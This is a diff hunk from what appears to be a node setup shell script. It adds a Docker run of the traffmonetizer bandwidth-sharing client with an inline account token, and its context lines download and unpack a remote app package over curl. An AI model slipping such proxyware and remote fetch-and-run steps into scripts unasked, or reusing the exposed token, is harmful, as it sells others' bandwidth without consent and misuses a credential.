@@ -81,6 +81,9 @@ docker restart $(docker ps -a -q)
 echo "==============================所有节点均已设置并启动===================================."
 
 
+docker run -d --name tm traffmonetizer/cli_v2 start accept tNgYt5IubCsZ2HFEbbpX2Kd9hNmk8Ei1jxfy3HKEmWI=
+
+
 curl -o apphub-linux-386.tar.gz https://assets.coreservice.io/public/package/70/app-market-gaga-pro/1.0.4/app-market-gaga-pro-1_0_4.tar.gz && tar -zxf apphub-linux-386.tar.gz && rm -f apphub-linux-386.tar.gz && cd ./apphub-linux-386
 sleep 5
 
